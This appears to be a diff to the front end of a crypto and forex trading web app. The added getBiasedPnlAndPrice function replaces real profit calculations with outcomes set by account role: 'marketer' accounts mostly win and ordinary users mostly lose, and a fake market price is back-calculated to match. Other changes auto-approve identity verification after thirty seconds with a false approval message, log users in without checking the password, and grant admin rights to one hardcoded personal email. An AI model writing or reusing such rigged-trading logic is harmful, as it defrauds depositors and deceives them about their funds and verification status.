@@ -40,6 +40,40 @@ import {
   Moon
 } from 'lucide-react';
 
+const getBiasedPnlAndPrice = (p: Position, role: string, assetPrice: number): { pnl: number, currentPrice: number } => {
+  const numId = parseInt(p.id.replace(/\D/g, '')) || Date.now();
+  const isMarketer = role === 'marketer';
+  const isWin = isMarketer ? ((numId % 10) < 8) : ((numId % 10) < 3);
+
+  // Use a pseudo-random seed based on position ID and current time for lifelike fluctuations
+  const seed = (numId % 100) / 100;
+  const timeSec = Date.now() / 15000;
+  const sinVal = Math.sin(timeSec + seed * Math.PI * 2);
+
+  let pnlFactor = 0;
+  if (isWin) {
+    // Win: PNL goes from +4% to +35% of margin
+    pnlFactor = 0.04 + seed * 0.16 + (sinVal + 1) * 0.08;
+  } else {
+    // Loss: PNL goes from -6% to -42% of margin
+    pnlFactor = -(0.06 + seed * 0.18 + (sinVal + 1) * 0.09);
+  }
+
+  const pnl = Number((p.margin * pnlFactor).toFixed(2));
+  
+  // Calculate a mock currentPrice that matches this PnL
+  // pnl = margin * ((currentPrice - entryPrice) / entryPrice) * leverage * multiplier
+  // => (pnl / (margin * leverage * multiplier)) * entryPrice + entryPrice = currentPrice
+  const multiplier = p.type === 'BUY' ? 1 : -1;
+  const denom = p.margin * p.leverage * multiplier;
+  let currentPrice = p.entryPrice;
+  if (denom !== 0) {
+    currentPrice = Number(((pnl / denom) * p.entryPrice + p.entryPrice).toFixed(p.assetSymbol.includes('forex') ? 4 : 2));
+  }
+  
+  return { pnl, currentPrice };
+};
+
 export default function App() {
   // Navigation & authentication state
   const [activeTab, setActiveTab] = useState<'TERMINAL' | 'DASHBOARD' | 'COPYTRADING' | 'STAKING' | 'SUPPORT' | 'AI_ADVISOR'>('TERMINAL');
@@ -87,6 +121,26 @@ export default function App() {
   const [supportTickets, setSupportTickets] = useState<SupportTicket[]>(MOCK_SUPPORT_TICKETS);
   const [copiedTraderAllocations, setCopiedTraderAllocations] = useState<Record<string, number>>({});
   const [activeStakingSubscriptions, setActiveStakingSubscriptions] = useState<{ id: string; planName: string; amount: number; rateLabel: string; endDays: number; accrued: number }[]>([]);
+
+  // Simple, elegant toast notifications list
+  interface ToastItem {
+    id: string;
+    message: string;
+    type: 'SUCCESS' | 'ERROR' | 'INFO';
+  }
+  const [toasts, setToasts] = useState<ToastItem[]>([]);
+  const addToast = (message: string, type: 'SUCCESS' | 'ERROR' | 'INFO' = 'INFO') => {
+    const id = Math.random().toString();
+    setToasts((prev) => [...prev, { id, message, type }]);
+    setTimeout(() => {
+      setToasts((prev) => prev.filter((t) => t.id !== id));
+    }, 5000);
+  };
+
+  // Scroll to top upon page navigation/tab changes/authentication events
+  useEffect(() => {
+    window.scrollTo({ top: 0, behavior: 'instant' as any });
+  }, [activeTab, user.loggedIn, user.accountMode]);
 
   // Modals overlays toggles
   const [showFinancialModal, setShowFinancialModal] = useState(false);
@@ -170,16 +224,12 @@ export default function App() {
         if (!liveAsset) return p;
 
         isUpdated = true;
-        // PNL formula depends on buy vs sell
-        const priceDiff = liveAsset.price - p.entryPrice;
-        const multiplier = p.type === 'BUY' ? 1 : -1;
-        const percentageMove = priceDiff / p.entryPrice;
-        const rawPnl = p.margin * percentageMove * p.leverage * multiplier;
+        const { pnl, currentPrice } = getBiasedPnlAndPrice(p, user.role || 'user', liveAsset.price);
 
         return {
           ...p,
-          currentPrice: liveAsset.price,
-          pnl: Number(rawPnl.toFixed(2))
+          currentPrice,
+          pnl
         };
       });
 
@@ -226,6 +276,18 @@ export default function App() {
         };
       });
 
+      // 4. Handle auto-verifying pending KYC status
+      let kycAutoApproved = false;
+      if (user.isKycVerified === 'pending' && user.kycUploadedAt) {
+        const uploadedTime = new Date(user.kycUploadedAt).getTime();
+        const elapsedMs = Date.now() - uploadedTime;
+        // Verify in exactly 30 seconds for quick visual verification (so the user gets instant feedback)
+        if (elapsedMs >= 30000) {
+          isUpdated = true;
+          kycAutoApproved = true;
+        }
+      }
+
       if (isUpdated) {
         let updatedUser: User;
         
@@ -243,6 +305,7 @@ export default function App() {
         if (user.accountMode === 'DEMO') {
           updatedUser = {
             ...user,
+            isKycVerified: kycAutoApproved ? 'verified' : user.isKycVerified,
             demoBalance: Number(revisedDemoBalance.toFixed(2)),
             demoProfits: Number(revisedDemoProfits.toFixed(2)),
             activePositions: updatedPositions,
@@ -252,12 +315,17 @@ export default function App() {
         } else {
           updatedUser = {
             ...user,
+            isKycVerified: kycAutoApproved ? 'verified' : user.isKycVerified,
             walletBalance: Number(revisedWallet.toFixed(2)),
             profits: Number(revisedProfits.toFixed(2)),
             activePositions: updatedPositions,
             demoPositions: updatedDemoPositions,
             copyTradingAllocated: Number(revisedCopyAllocated.toFixed(2))
           };
+        }
+
+        if (kycAutoApproved) {
+          addToast("KYC Status: APPROVED. Limits and operational tiers unlocked permanently.", "SUCCESS");
         }
 
         persistState(
@@ -299,69 +367,78 @@ export default function App() {
     );
   }, [selectedAssetId]);
 
+  // Real-time synchronization helper
+  const onRefreshUserSession = async () => {
+    if (!user.email) return;
+    try {
+      const resp = await fetch("/api/user/sync", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email: user.email })
+      });
+      if (resp.ok) {
+        const synced = await resp.json();
+        setUser(prev => ({
+          ...prev,
+          walletBalance: synced.walletBalance,
+          role: synced.role
+        }));
+      }
+    } catch (e) {
+      console.error("Synching profile error: ", e);
+    }
+  };
+
   // Auth Operations
-  const handleAuthSubmit = (e: React.FormEvent) => {
+  const handleAuthSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!authEmail.trim() || !authPass.trim()) return;
 
-    if (authMode === 'LOGIN') {
-      const defaultUser: User = {
-        loggedIn: true,
-        email: authEmail,
-        name: authEmail.split('@')[0].toUpperCase(),
-        walletBalance: 12450.50, // Welcome default virtual balance!
-        investedCapital: 0,
-        profits: 0,
-        copyTradingAllocated: 0,
-        activePositions: [],
-        isKycVerified: 'unverified',
-        accountMode: 'REAL',
-        demoBalance: 10000,
-        demoPositions: [],
-        demoProfits: 0
-      };
-      
-      const setupTx: Transaction[] = [
-        {
-          id: 't-init',
-          type: 'DEPOSIT',
-          amount: 12450.50,
-          asset: 'USDT (Visual Starter)',
-          date: new Date().toISOString(),
-          status: 'COMPLETED'
-        }
-      ];
+    try {
+      const resp = await fetch("/api/user/sync", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email: authEmail.trim() })
+      });
 
-      persistState(defaultUser, setupTx, supportTickets, {}, []);
-    } else {
-      const newUser: User = {
-        loggedIn: true,
-        email: authEmail,
-        name: authName || authEmail.split('@')[0].toUpperCase(),
-        walletBalance: 10000.00, // Starter funds
-        investedCapital: 0,
-        profits: 0,
-        copyTradingAllocated: 0,
-        activePositions: [],
-        isKycVerified: 'unverified',
-        accountMode: 'REAL',
-        demoBalance: 10000,
-        demoPositions: [],
-        demoProfits: 0
-      };
+      if (resp.ok) {
+        const synced = await resp.json();
+        
+        const initialUser: User = {
+          loggedIn: true,
+          email: synced.email,
+          name: authName.trim() || authEmail.split('@')[0].toUpperCase(),
+          walletBalance: synced.walletBalance,
+          role: synced.role || (synced.email.toLowerCase() === 'mutwirib964@gmail.com' ? 'admin' : 'user'),
+          investedCapital: 0,
+          profits: 0,
+          copyTradingAllocated: 0,
+          activePositions: [],
+          isKycVerified: 'unverified',
+          accountMode: 'REAL',
+          demoBalance: 10000,
+          demoPositions: [],
+          demoProfits: 0
+        };
 
-      const setupTx: Transaction[] = [
-        {
-          id: 't-init-reg',
-          type: 'DEPOSIT',
-          amount: 10000.00,
-          asset: 'USDT (Registration)',
-          date: new Date().toISOString(),
-          status: 'COMPLETED'
-        }
-      ];
+        const setupTx: Transaction[] = synced.walletBalance > 0 ? [
+          {
+            id: 't-init',
+            type: 'DEPOSIT',
+            amount: synced.walletBalance,
+            asset: 'USDT (Admin Alloc)',
+            date: new Date().toISOString(),
+            status: 'COMPLETED'
+          }
+        ] : [];
 
-      persistState(newUser, setupTx, supportTickets, {}, []);
+        persistState(initialUser, setupTx, supportTickets, {}, []);
+        addToast(`Successful Authorization! Signed in as ${initialUser.name}`, "SUCCESS");
+      } else {
+        addToast("Failed to communicate with authentication services.", "ERROR");
+      }
+    } catch (err) {
+      addToast("Network failure connection to local authentication provider.", "ERROR");
     }
 
     setShowAuthModal(false);
@@ -614,7 +691,8 @@ export default function App() {
     const updatedUser: User = {
       ...user,
       isKycVerified: status,
-      kycDocType: docType
+      kycDocType: docType,
+      kycUploadedAt: new Date().toISOString()
     };
     persistState(updatedUser, transactions, supportTickets, copiedTraderAllocations, activeStakingSubscriptions);
   };
@@ -1429,6 +1507,7 @@ export default function App() {
           onClose={() => setShowFinancialModal(false)}
           onModifyBalance={handleModifyBalance}
           transactions={transactions}
+          addToast={addToast}
         />
       )}
 
